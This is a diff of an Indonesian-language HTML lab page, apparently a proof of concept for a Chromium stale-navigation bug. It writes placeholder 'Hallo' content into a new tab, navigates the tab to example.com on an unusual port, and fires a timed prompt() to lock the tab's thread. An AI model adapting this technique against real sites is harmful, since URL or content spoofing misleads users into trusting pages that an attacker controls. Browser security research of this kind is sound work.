@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Chromium Navigation Desync - Advanced Lab POC</title>
+    <title>Chromium Stale Navigation & Invalid Port Lab</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
@@ -57,7 +57,7 @@
             font-size: 0.75rem;
             color: #4ade80;
             text-align: left;
-            height: 100px;
+            height: 120px;
             overflow-y: auto;
         }
     </style>
@@ -65,9 +65,9 @@
 <body>
 
     <div class="wrapper">
-        <h2>Navigation Desync Lab</h2>
-        <p>Simulasi urutan pemicu asinkron & pemblokiran utas modal.</p>
-        <button id="launchBtn">JALANKAN POC</button>
+        <h2>Stale Nav & Port Lab</h2>
+        <p>Simulasi injeksi DOM dengan pemicu port tidak aman / tertahan.</p>
+        <button id="launchBtn" class="btn-trigger">JALANKAN STRESS TEST</button>
         <div id="logBox" class="logger">[System] Menunggu interaksi pengguna...</div>
     </div>
 
@@ -92,36 +92,38 @@
             }
 
             try {
-                // 2. Menyuntikkan konten awal ke dalam dokumen kosong
+                // 2. Menyuntikkan konten awal "Hallo" ke dalam dokumen kosong
                 newTab.document.open();
                 newTab.document.write(`
                     <!DOCTYPE html>
                     <html>
-                    <head><title>Injected View</title></head>
+                    <head><title>Stale Test View</title></head>
                     <body style="background:#ffffff; color:#0f172a; text-align:center; padding-top:80px; font-family:sans-serif;">
                         <h1 style="font-size: 3rem; color: #1e293b;">Hallo</h1>
-                        <p style="color: #64748b;">Konteks render awal sebelum navigasi dialihkan.</p>
+                        <p style="color: #64748b;">Konteks render awal (Pending Navigation Target).</p>
                     </body>
                     </html>
                 `);
                 newTab.document.close();
-                addLog("Konten 'Hallo' berhasil disuntikkan.");
+                addLog("Konten 'Hallo' berhasil disuntikkan ke about:blank.");
 
-                // 3. Memicu navigasi asinkron tertunda ke domain target (misal: example.com)
+                // 3. Memicu navigasi ke port yang tidak aman / diblokir (Unsafe Port, misal port 65535 atau port khusus)
+                // Chromium secara otomatis memblokir port tertentu dengan ERR_UNSAFE_PORT atau menahan status navigasi.
                 setTimeout(() => {
-                    addLog("Memicu lokasi ke target eksternal...");
-                    newTab.location.href = "https://example.com";
-                }, 10);
+                    addLog("Memicu navigasi ke Invalid/Unsafe Port...");
+                    // Contoh port tidak aman yang memicu pembatasan jaringan Chromium
+                    newTab.location.href = "https://example.com:65535";
+                }, 50);
 
-                // 4. Memicu dialog modal sinkronus untuk menguji penguncian utas utama (main thread)
+                // 4. Memicu dialog modal sinkronus untuk menguji penguncian utas utama (main thread lock)
                 setTimeout(() => {
-                    addLog("Mengeksekusi dialog modal (prompt)...");
+                    addLog("Mengeksekusi dialog modal (prompt) untuk mengunci thread...");
                     try {
-                        newTab.prompt("ROOT CAUSE / THREAD LOCK", "Verification");
+                        newTab.prompt("STALE NAVIGATION / THREAD LOCK", "Verify State");
                     } catch (e) {
                         addLog("Modal dibatasi oleh kebijakan keamanan sandbox.");
                     }
-                }, 300);
+                }, 250);
 
             } catch (err) {
                 addLog("EXCEPTION: " + err.message);
